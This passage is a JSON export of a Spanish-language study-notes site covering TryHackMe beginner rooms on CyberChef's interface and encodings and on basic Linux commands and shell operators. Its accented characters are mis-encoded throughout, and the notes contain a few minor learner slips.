en may√∫scula | `- .... .-. . .- - ...` se transforma en `THREATS`                                                                                                                                       |\n| URL Encode      | Codifica caracteres especiales en su forma URL               | `https://tryhackme.com/r/room/cyberchefbasics` se convierte en `https%3A%2F%2Ftryhackme%2Ecom%2Fr%2Froom%2Fcyberchefbasics`                                                              |\n| To Base64       | Codifica informaci√≥n raw en base64                           | `This is fun!` se convierte en `VGhpcyBpcyBmdW4h`                                                                                                                                        |\n| To Hex          | Convierte el inut en formato hexadecimal                     | `This Hex conversion is awesome!` se convierte en `54 68 69 73 20 48 65 78 20 63 6f 6e 76 65 72 73 69 6f 6e 20 69 73 20 61 77 65 73 6f 6d 65 21`                                         |\n| To Decimal      | Convierte el input en un array de decimales                  | `This Decimal conversion is awesome!` se convierte en `84 104 105 115 32 68 101 99 105 109 97 108 32 99 111 110 118 101 114 115 105 111 110 32 105 115 32 97 119 101 115 111 109 101 33` |\n| ROT13           | Sustituci√≥n C√©sar simple                                     | `Digital Forensics and Incident Response` se convierte en `Qvtvgny Sberafvpf naq Vapvqrag Erfcbafr`                                                                                      |\n\n-------------------------------\n<h2>Receta</h2>\nSe considera el coraz√≥n de la herramienta. Aqu√≠ puedes seleccionar, ordenar y ajustar las operaciones para que cumplan tus necesidades. Aqu√≠ es donde tomas control, definiendo el argumento de cada operaci√≥n. En esta √°rea puedes arrastrar las operaciones que quieres usar y especificar argumentos y opciones.\n\nLas funcionalidades incluyen:\n\n- `Save recipe`: Te permite guardar las operaciones seleccionadas.\n- `Load recipe`: Te permite cargar una receta previamente guardada.\n- `Clear recipe`: Te permite limpiar las recetas elegidas durante un uso.\n\nLas puedes encontrar en los iconos:\n\n![[Pasted image 20251026132259.png]]\n\nLa parte de abajo es `BAKE!` que significa ornear. Esto procesa la informaci√≥n con la receta dada.\n\nAdicionalmente, puedes marcar la opci√≥n `Auto Bake`, lo que te permite cocinar la receta seleccionada sin necesidad de darle a Bake constantemente.\n\n--------------------------------\n<h2>Input</h2>\nOfrece un espacio donde puedes introducir f√°cilmente texto o archivos pegando, arrastrando o escribiendo directamente para realizar operaciones sobre ellos.\n\n![[Pasted image 20251026133558.png]]\n\nAdem√°s, tiene las siguientes funcionalidades:\n\n- `Add a new input tab`: Aqu√≠ es donde la pesta√±a adicional se crea para que el usuario use diferentes valores de la pesta√±a anterior.\n  ![[Pasted image 20251026133604.png]]\n- `Open folder as input`: Esta funcionalidad permite subir un directorio entero como valor de input.\n  ![[Pasted image 20251026133615.png]]\n- `Open file as input`: Permite subir un archivo como input.\n  ![[Pasted image 20251026133629.png]]\n- `Clear input and output`: Esta funcionalidad permite al usuario limpiar cualquier valor de input insertados y su correspondiente valor output.\n- `Reset pane layout`: Esta funcionalidad trae la interfaz de herramientas a su valor de tama√±o por defecto.\n\n------------------------------------\n<h2>Output</h2>\nEs un espacio visual que muestra la informaci√≥n procesada. Presenta la salida de la receta de forma limpia y ordenada.\n\n![[Pasted image 20251026133637.png]]\n\nLas funcionalidades incluyen:\n\n- `Save output to file`: Permite guardar los resultados en un archivo.\n- `Copy raw output to the clipboard`: Esta funcionalidad permite a los usuarios copiar output raw directamente a la clipboard, permitiendo que lo peguen en cualquier sitio r√°pidamente.\n- `Replace input with output`: Permite a los usuarios sobrescribir r√°pidamente la informaci√≥n de input basada en los resultados de la operaci√≥n.\n- `Maximise output pane`: Devuelve la interfaz de herramientas a su tama√±o por defecto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. CyberChef - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/0-cyberchef-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/0. CyberChef - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/1. Introduction]]\n[[2. Accessing the Tool]]\n[[3. Navigating the Interface]]\n[[4. Before Anything Else]]\n[[5. Practice, Practice, Practice]]\n[[6. Your First Official Cook]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Practice, Practice, Practice",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/5-practice-practice-practice/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/5. Practice, Practice, Practice.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "Como queremos prepararte bien, exploraremos en esta tarea las categor√≠as de operaciones m√°s usadas.\n\n-------------------------------\n<h2>Extractores</h2>\nLas operaciones espec√≠ficas mencionadas en la tabla recaen bajo la categor√≠a de Extractores.\n\n| Espec√≠fico              | Descripci√≥n                                                                                             |\n| ----------------------- | ------------------------------------------------------------------------------------------------------- |\n| Extract IP addresses    | Extrae direcciones IPv4 e IPv6.                                                                         |\n| Extract URLs            | Extrae URLs del input, se requiere el protocolo (HTTP, FTP, etc.). Si no habr√° muchos falsos positivos. |\n| Extract email addresses | Extrae todas las direcciones de mail del input.                                                         |\n\n-----------------------------\n<h2>Fecha y Hora</h2>\nLas operaciones espec√≠ficas mencionadas en la tabla recaen bajo la categor√≠a de Fecha y Hora.\n\n| Espec√≠fico          | Descripci√≥n                                                                         |\n| ------------------- | ----------------------------------------------------------------------------------- |\n| From UNIX Timestamp | Convierte timestamp UNIX a string fecha y hora.                                     |\n| To UNIX Timestamp   | Parsea una string fecha y hora en UTC y devuelve el correspondiente timestamp UNIX. |\nUn timestamp UNIX es un valor de 32 bits que representa el n√∫mero de segundos desde el 1 de Enero de 1970\n\n-----------------------\n<h2>Formato de la Informaci√≥n</h2>\nLas operaciones espec√≠ficas mencionadas en la tabla recaen bajo la categor√≠a de Formato de la Informaci√≥n.\n\n| Operations  | Description                                     | Examples                                                                                        |\n| ----------- | ----------------------------------------------- | ----------------------------------------------------------------------------------------------- |\n| From Base64 | Decodea Base64 a texto raw                      | `V2VsY29tZSB0byB0cnloYWNrbWUh` se vuelve `Welcome to tryhackme!`                                |\n| URL Decode  | Convierte caracteres URL encodeados a texto raw | `https%3A%2F%2Fgchq%2Egithub%2Eio%2FCyberChef%2F` se vuelve `https://gchq.github.io/CyberChef/` |\n| From Base85 | Decodea informaci√≥n de una string ASCII         | `BOu!rD]j7BEbo7` se vuelve `hello world`                                                        |\n| From Base58 | Decodea como base64                             | `AXLU7qR` se vuelve`Thm58`                                                                      |\n| To Base62   | Encodea usando un set restringido de s√≠mbolos   | `Thm62` se vuelve`6NiRkOY`                                                                      |\nOperaciones como `Base(64, 85, 58,62)` son conocidas como \"Base Encodings\". Estos toman informaci√≥n en binario (0s y 1s) y lo transforman en una representaci√≥n basada en texto usando un set de caracteres ASCII espec√≠ficos.\n\n--------------------------------------\n<h2>Ejemplo</h2>\nVeamos la operaci√≥n m√°s usada, `Base64`:\n\nNuestro ejemplo ser√° encodear las letras \"**THM**\". Para eso usamos la tabla ASCII. Si quieres ver la tabla ASCII completa haz click en este [link](https://en.wikipedia.org/wiki/ASCII).\n\n| Decimal | Binary   | Symbol |\n| ------- | -------- | ------ |\n| 65      | 01000001 | A      |\n| 66      | 01000010 | B      |\n| 67      | 01000011 | C      |\n| 68      | 01000100 | D      |\n| 69      | 01000101 | E      |\n| 70      | 01000110 | F      |\n| 71      | 01000111 | G      |\n| 72      | 01001000 | H      |\n| 73      | 01001001 | I      |\n| 74      | 01001010 | J      |\n| 75      | 01001011 | K      |\n| 76      | 01001100 | L      |\n| 77      | 01001101 | M      |\n| 78      | 01001110 | N      |\n| 79      | 01001111 | O      |\n| 80      | 01010000 | P      |\n| 81      | 01010001 | Q      |\n| 82      | 01010010 | R      |\n| 83      | 01010011 | S      |\n| 84      | 01010100 | T      |\n| 85      | 01010101 | U      |\n| 86      | 01010110 | V      |\n| 87      | 01010111 | W      |\n| 88      | 01011000 | X      |\n| 89      | 01011001 | Y      |\n| 90      | 01011010 | Z      |\n<h4>Paso 1: Convertir a Binario y Fusionar</h4>\nBas√°ndonos en la tabla de arriba, **T = 01010100**, **H=01001000**, **M = 01001101**. Ahora los concatenamos y nos aseguramos de que son 24 caracteres: `010101000100100001001101`.\n\n-------------------------------\n<h4>Paso 2: Dividir y Convertir a Decimal</h4>\nSeparamos `010101000100100001001101` en grupos de 6 caracteres cada uno. Nos quedan: `010101`, `000100`, `100001` y `001101`. Ahora hay que convertirlos en decimal:\n\n| Binario | Decimal  |\n| ------- | -------- |\n| 010101  | 21       |\n| 000100  | 4        |\n| 100001  | 33       |\n| 001101  | 13       |\n\n-------------------------------\n<h4>Paso 3: Convertir a Base64</h4>\nAhora que tenemos los n√∫meros del paso anterior, buscamos su equivalente en la tabla siguiente:\n\n| Index | Character |\n| ----- | --------- |\n| 0     | **A**     |\n| 1     | **B**     |\n| 2     | **C**     |\n| 3     | **D**     |\n| 4     | **E**     |\n| 5     | **F**     |\n| 6     | **G**     |\n| 7     | **H**     |\n| 8     | **I**     |\n| 9     | **J**     |\n| 10    | **K**     |\n| 11    | **L**     |\n| 12    | **M**     |\n| 13    | **N**     |\n| 14    | **O**     |\n| 15    | **P**     |\n| 16    | **Q**     |\n| 17    | **R**     |\n| 18    | **S**     |\n| 19    | **T**     |\n| 20    | **U**     |\n| 21    | **V**     |\n| 22    | **W**     |\n| 23    | **X**     |\n| 24    | **Y**     |\n| 25    | **Z**     |\n| 26    | **a**     |\n| 27    | **b**     |\n| 28    | **c**     |\n| 29    | **d**     |\n| 30    | **e**     |\n| 31    | **f**     |\n| 32    | **g**     |\n| 33    | **h**     |\n| 34    | **i**     |\n| 35    | **j**     |\n| 36    | **k**     |\n| 37    | **l**     |\n| 38    | **m**     |\n| 39    | **n**     |\n| 40    | **o**     |\n| 41    | **p**     |\n| 42    | **q**     |\n| 43    | **r**     |\n| 44    | **s**     |\n| 45    | **t**     |\n| 46    | **u**     |\n| 47    | **v**     |\n| 48    | **w**     |\n| 49    | **x**     |\n| 50    | **y**     |\n| 51    | **z**     |\n| 52    | **0**     |\n| 53    | **1**     |\n| 54    | **2**     |\n| 55    | **3**     |\n| 56    | **4**     |\n| 57    | **5**     |\n| 58    | **6**     |\n| 59    | **7**     |\n| 60    | **8**     |\n| 61    | **9**     |\n| 62    | **+**     |\n| 63    | **/**     |\nTransformamos:\n\n|Index|Characters|\n|---|---|\n|21|V|\n|4|E|\n|33|h|\n|13|N|\nCombinando estos caracteres obtenemos que `THM` en Base64 es `VEhN`.\n\nVeamos ahora el `URL Decode`. Esto funciona convirtiendo los caracteres encodeados con porcentaje de vuelta a sus valores originales. Para una referencia de estos valores puedes consultar este [link](https://en.wikipedia.org/wiki/Percent-encoding). El set de caracteres por defecto en `HTML5` es `UTF-8`. Aqu√≠ una tabla con caracteres que sueles ver en las URLs:\n\n| Characters | From UTF-8 |\n| ---------- | ---------- |\n| :          | %3A        |\n| /          | %2F        |\n| .          | %2E        |\n| =          | %3D        |\n| #          | %23        |\n\n-------------------------------------\n<h2>Ejercicio Pr√°ctico</h2>\nDescarga el archivo de ejercicio. Una vez descargado puedes copiar y pegar el contenido en el `Input` o usar `Open file as input`.\n\n1. Abrimos el archivo en CyberChef:\n   ![[Pasted image 20251026145256.png]]\n2. Arrastramos el `Extract email addresses` en el apartado de `Extractors` y como tenemos `Auto Bake` seleccionado lo vemos instant√°neamente:\n   ![[Pasted image 20251026145409.png]]\n3. Hacemos lo mismo para la IP:\n   ![[Pasted image 20251026145503.png]]\n4. Y para el dominio:\n   ![[Pasted image 20251026145542.png]]\n5. Para convertir un n√∫mero en otro usamos los conversores de decimal a binario de `Data Format`:\n   ![[Pasted image 20251026145754.png]]\n6. Del apartado de `Networking` cogemos `URL Encode` y seleccionamos que encodee todos los caracteres especiales:\n   ![[Pasted image 20251026150052.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Before Anything Else",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/4-before-anything-else/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/4. Before Anything Else.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "Tranquilidad! Antes de ir al meollo, veamos r√°pidamente el proceso de pensamiento al usar CyberChef. Este proceso consiste de cuatro pasos diferentes:\n\n![[Pasted image 20251026134118.png]]\nVeamos cada paso un poco en detalle.\n\nAcordar un objetivo clave es esencial. Este paso incluye definir metas espec√≠ficas y conseguibles. Ayuda a responder a la pregunta: **\"¬øQu√© quiero lograr?\"**. Los objetivos son vitales para ofrecer direcci√≥n, prop√≥sito y enfoque en las metas.\n\nEn el segundo paso es donde pegas o introduces la informaci√≥n que posees.\n\nEl tercer paso es seleccionar las operaciones que quieres usar. Esto puede ser dif√≠cil, especialmente si no est√°s familiarizado con lo que est√°s lidiando.\n\nPor √∫ltimo, comprobamos el output de CyberChef. Esto responde a la pregunta: **\"¬øHemos conseguido nuestro objetivo?\"**. Si no lo hemos conseguido puede estar bien volver al paso 3 para volver a intentarlo o incluso al 1, para replantearnos las metas.\n\nUn ejemplo:\n\n![[Pasted image 20251026134700.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Linux Fundamentals",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/4-linux-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/4. Linux Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals",
    "content": "1. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/0. Linux Fundamentals 1]]\n2. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/0. Linux Fundamentals 2]]\n3. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/0. Linux Fundamentals 3]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to cybersecurity",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/1-introduction-to-cybersecurity/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Introduction to cybersecurity.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity",
    "content": "1. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/0. Offensive Security Intro]]\n2. [[0. Deffensive Security Intro]]\n3. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/0. Careers in Cyber]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. How the Web Works",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-the-web-works/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How the Web Works.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works",
    "content": "1. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/1. DNS in Detail/0. DNS in Detail]]\n2. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/0. HTTP in Detail]]\n3. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n4. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/4. Putting it All Together/0. Putting it All Together]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Network Fundamentals",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/2-network-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/2. Network Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals",
    "content": "1. [[0. What is Networking]]\n2. [[0. Introduction to LAN]]\n3. [[0. OSI Model]]\n4. [[0. Packets and Frames]]\n5. [[0. Extending your Network]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Windows Fundamentals",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/5-windows-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/5. Windows Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals",
    "content": "1. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/1. Windows Fundamentals Part 1/0. Windows Fundamentals 1]]\n2. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/2. Windows Fundamentals Part 2/0. Windows Fundamentals 2]]\n3. [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/0. Windows Fundamentals 3]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Running your First few Commands",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/3-running-your-first-few-commands/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/3. Running your First few Commands.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "Como hemos visto la ventaja principal es la poca cantidad de memoria que necesitan estos sistemas para funcionar. De todas formas esto implica que muchas veces no tienen GUI o \"escritorio\". Una gran parte, entonces, de la interacci√≥n con estos sistemas se hace a trav√©s de una terminal con una l√≠nea de comandos.\n\n```bash\ntryhackme@linux1:~$ introduce_comandos__aqu√≠\n```\n\nAs√≠ se ve una terminal.\n\nNecesitamos hacer funciones b√°sicas como navegar entre archivos, ver sus contenidos o crear archivos. Vamos a empezar con algunos comandos b√°sicos:\n\n| Command | Description                                                    |\n| ------- | -------------------------------------------------------------- |\n| echo    | Muestra por la salida est√°ndar cualquier texto que le pasemos. |\n| whoami  | Nos dice qu√© usuario somos actualmente.                        |\nSi queremos imprimir una sola palabra no necesitamos comillas, sin embargo si queremos imprimir m√°s, s√≠:\n\n```bash\ntryhackme@linux1:~$ echo Hello\nHello\ntryhackme@linux1:~$ echo \"Hello Friend!\"\nHello Friend!\n```\n\nWhoami puede ser usado as√≠:\n\n```bash\ntryhackme@linux1:~$ whoami\ntryhackme\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Searching for files",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/5-searching-for-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/5. Searching for files.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "Una de las caracter√≠sticas principales de Linux es lo eficiente que puedes ser con √©l.\n\nPara encontrar archivos en el sistema no hace falta usar cd y ls constantemente sino que podemos usar comandos como find para automatizar la b√∫squeda.\n\n---------------------\n<h2>Usando Find</h2>\nSi sabemos el nombre exacto de lo que buscamos pero no nos acordamos d√≥nde est√°:\n\n```bash\ntryhackme@linux1:~$ find -name passwords.txt\n./floder1/passwords.txt\n```\n\nSi no nos acordamos del nombre entero pero si de la extensi√≥n podr√≠amos realizar una b√∫squeda de la siguiente manera:\n\n```bash\ntryhackme@linux1:~$ find -name *.txt\n./folder1/passwords.txt\n./Documents/todo.txt\n```\n\n----------------------\n<h2>Usando Grep</h2>\nEl comando grep nos permite buscar contenidos de un archivo espec√≠fico.\n\nTomemos como ejemplo el archivo access.log que tiene 244 l√≠neas:\n\n```bash\ntryhackme@linux1:~$ wc -l access.log\n244 access.log\n```\n\nPodemos usar grep para filtrar el contenido que nos interese, en este caso ver si la IP 81.143.211.90  se encuentra en el archivo:\n\n```bash\ntryhackme@linux1:~$ grep \"81.143.211.90\" access.log\n81.143.211.90 - - [25/Mar/2021:11:17 + 0000] \"GET / HTTP/1.1\" 200 417 \"-\" \"Mozilla/5.0 (Linux; Android 7.0; Moto G(4))\"\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "Linux es uno de los sistemas operativos m√°s utilizados en el mundo, corriendo en coches inteligentes, dispositivos android, supercomputadoras, servidores, etc. Cubriremos algunos de los b√°sicos de Linux.\n\n- Ejecutar tus primeros comandos en una m√°quina Linux.\n- Ense√±arte algunos comandos esenciales usados para interactuar con el sistema de ficheros.\n- Desmostrar c√≥mo puedes buscar archivos e introducirte en los operadores shell.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. A Bit of Background on Linux",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/2-a-bit-of-background-on-linux/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/2. A Bit of Background on Linux.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "<h2>¬øD√≥nde se usa Linux?</h2>\nLinux es considerablemente m√°s ligero que otros sistemas operativos y es posible que hayas utilizado Linux sin haberte dado cuenta. Linux se utiliza en:\n\n- P√°ginas web que visitas.\n- Paneles de control/entretenimiento en los coches.\n- Puntos de venta como los checkouts.\n- Infraestructuras cr√≠ticas, como las luces de tr√°fico.\n\n------------------\n<h2>Sabores de Linux</h2>\nLinux es realmente un paraguas bajo el cual descansan varios sistemas operativos basados en UNIX. Gracias a que Linux es de c√≥digo abierto, las variantes de Linux tienen todos los colores y formas y se pueden personalizar para crear el tuyo propio adecuado a tus necesidades.\n\nUbuntu y Debian son dos de las distribuciones m√°s utilizadas. Servidores de Ubuntu pueden correr en sistemas con s√≥lo 512MB de RAM.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. An Introduction to Shell Operators",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/6-an-introduction-to-shell-operators/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/6. An Introduction to Shell Operators.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "Los operadores en Linux son una manera fant√°stica de almpliar el nivel de trabajo con Linux. Hay unos cuantos operadores que debemos aprender a usar:\n\n| Symbol / Operator | Description                                                                                                                                   |\n| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |\n| &                 | Este operador te permite ejecutar comandos en segundo plano.                                                                                  |\n| &&                | Este operador te permite combinar varios comandos en uno.                                                                                     |\n| >                 | Este operador es un redirector, coge el resultado de otro comando o un archivo y redirige por la salida est√°ndar hasta el sitio especificado. |\n| >>                | Hace lo mismo que el de arriba, pero a√±adiendo en vez de desplazando.                                                                         |\n\n---------------\n<h2>Operador \"&\"</h2>\nNos permite ejecutar comandos en el fondo (segundo plano). Por ejemplo imagin√©monos que queremos hacer una copia de un archivo muy grande. Esto obviamente tomar√° un rato y nos dejar√° sin poder utilizar la terminal.\n\n```bash\ntryhackme@linux1:~$ copy large_file.txt large_file_copy.txt &\n```\n\n---------------\n<h2>Operador \"&&\"</h2>\nPodemos usarlo para unir dos comandos: `comando1 && comando2`. El problema es que `comando2` s√≥lo se ejecutar√° si `comando1` fue exitoso.\n\n\n---------------\n<h2>Operador \">\"</h2>\nEs conocido como redirector de salida (output redirector).\n\nHemos visto que `echo howdy` nos devuelve howdy, pero esto no es muy √∫til. algo mejor ser√≠a meterlo en un archivo:\n\n```bash\ntryhackme@linux1:~$ echo hey > welcome\ntryhackme@linux1:~$ cat welcome\nhey\n```\n\n>[!WARNING] Si el archivo ya existe ser√° sobreescrito (se borrar√°n los datos ya existentes para dejar los nuevos).\n\n---------------\n<h2>Operador \">>\"</h2>\nTambi√©n es un redirector de salida como el previo que hemos visto. De todas formas, lo que hace a este operador diferente es el hecho de que no sobreescribe informaci√≥n, sino que a√±ade al existente (si hay, si no crea uno) la nueva informaci√≥n.\n\n```bash\ntryhackme@linux1:~$ echo hello >> welcome\ntryhackme@linux1:~$ cat welcome\nhey\nhello\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Linux Fundamentals 1",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/0-linux-fundamentals-1/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/0. Linux Fundamentals 1.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/1. Introduction|1. Introduction]]\n[[2. A Bit of Background on Linux]]\n[[3. Running your First few Commands]]\n[[4. Interacting with the Filesystem]]\n[[5. Searching for files]]\n[[6. An Introduction to Shell Operators]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Interacting with the Filesystem",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/4-interacting-with-the-filesystem/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/4. Interacting with the Filesystem.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "En esta lecci√≥n veremos c√≥mo navegar en el sistema de ficheros, leer y crear archivos.\n\n<h2>Interactuar con el Sistema de Ficheros</h2>\nSer capaz de navegar entre ficheros es esencial, para ello:\n\n| Command | Full Name                                             |\n| ------- | ----------------------------------------------------- |\n| ls      | Listar los archivos de un directorio                  |\n| cd      | Cambiar de directorio.                                |\n| cat     | Concatenar los caracteres de un archivo               |\n| pwd     | Print Working Directory, muestra el directorio actual |\n\n-----------------\n<h3>Listar los Archivos</h3>\nAntes de poder hacer nada como leer el contenido de archivos, necesitamos saber qu√© existe.\n\nPara esto podemos usar ls. Podemos usar ls en rutas absolutas o relativas, no s√≥lo en nuestro directiorio actual.\n\n```bash\ntryhackme@linux1:~$ ls\n'Important Files' 'My Documents' Notes Pictures\n```\n\n-------------------\n<h3>Cambiar nuestro Directorio actual</h3>\nChang Directory (cd) sirve para cambiar de directorio:\n\n```bash\ntryhackme@linux1:~$ cd Pictures\ntryhackme@linux1:~/Pictures$ ls\ndog_picture1.jpg dog_picture2.jpg dog_picture3.jpg\n```\n\n--------------------------\n<h3>Viendo el contenido de un Archivo</h3>\nCat es una abreviatura de concatenate, que implica concatenar los bits de texto en un s√≥lo output, si no se especifica ese canal de salida, ser√° la pantalla.\n\n```txt\ntryhackme@linux1:~/Documents$ cat todo.txt\nHere's something important for me to do later!\n```\n\n--------------------------\n<h3>Encontrando el path entero a nuestro Directorio Actual de Trabajo</h3>\nPara saber en qu√© directorio estamos actualmente existe un comando: pwd (Print Working Directory):\n\n```bash\ntryhackme@linux1:~/Documents$ pwd\n/home/ubuntu/Documents\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "En este tema veremos algunas utilidades y aplicaciones √∫tiles. Aprenderemos sobre automatizaci√≥n, manejo de paquetes y loguearse en servicios/aplicaciones.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Processes 101",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/4-processes-101/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/4. Processes 101.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
